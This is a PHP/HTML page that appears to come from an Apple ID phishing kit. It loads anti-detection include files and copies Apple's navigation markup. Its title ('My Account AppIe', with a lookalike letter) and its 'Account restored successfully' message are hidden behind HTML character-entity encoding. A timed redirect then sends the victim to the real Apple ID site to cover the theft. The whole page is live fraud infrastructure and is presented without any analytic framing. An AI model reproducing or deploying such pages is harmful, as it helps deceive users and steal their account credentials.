<?php
session_start();
include '../anti/anti1.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti8.php';
?>
<!doctype html>
<head>
   <link rel="shortcut icon" href="./files/fav.ico" type="image/X-icon">
   <title>&#x4d;&#x79;&#x20;&#x41;&#x63;&#x63;&#x6f;&#x75;&#x6e;&#x74;&#x20;&#x41;&#x70;&#x70;&#x49;&#x65;</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="viewport" content="width=device-width">
   <link rel="stylesheet" href="./files/signin.css" media="screen, print">
   <link rel="stylesheet" href="./files/external.css" media="screen, print">
   <meta http-equiv="Refresh" content="6; URL=https://appleid.apple.com/">
</head>
<body style="zoom: 0;">
   <div id="page">
      <nav id="ac-globalnav" class="js no-touch">
         <nav id="ac-globalnav" class="js no-touch">
            <div id="orinput" class="ac-gn-content">
               <ul class="ac-gn-header">
                  <li class="ac-gn-item ac-gn-menuicon">
                     <label class="ac-gn-menuicon-label">
                     <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
                     <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
                     </span>
                     <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
                     <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
                     </span>
                     </label>
                  </li>
                  <li class="ac-gn-item ac-gn-apple">
                     <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus-small">
                     </a>
                  </li>
                  <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
                     <a href="#" class="ac-gn-link ac-gn-link-bag">
                     <span class="ac-gn-bag-badge"></span>
                     </a>
                     <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                  </li>
               </ul>
            </div>
            <ul class="ac-gn-list">
               <li class="ac-gn-item ac-gn-apple">
                  <a href="#" class="ac-gn-link ac-gn-link-apple" id="ac-gn-firstfocus">
                  </a>
               </li>
               <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
                  <a href="#" class="ac-gn-link ac-gn-link-search" id="ac-gn-link-search"></a>
               </li>
               <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
                  <a href="#" class="ac-gn-link ac-gn-link-bag">
                  <span class="ac-gn-bag-badge" aria-hidden="true"></span>
                  </a>
                  <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
               </li>
            </ul>
   </div>
   </nav>
   </nav>
   </div>
   </div>
<center>
<br><br><br>
                <h1>&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#114;&#101;&#115;&#116;&#111;&#114;&#101;&#100;&#32;&#115;&#117;&#99;&#99;&#101;&#115;&#115;&#102;&#117;&#108;&#108;&#121;</h1>
                <p>&#82;&#101;&#100;&#105;&#114;&#101;&#99;&#116;&#32;&#105;&#110;&#32;&#53;&#32;&#115;&#101;&#99;&period;&period;&period;</p>
                <p><img src="./files/iphone-spinner.gif"></p><br><br><br>
</center>
   </div>
</body>
</html>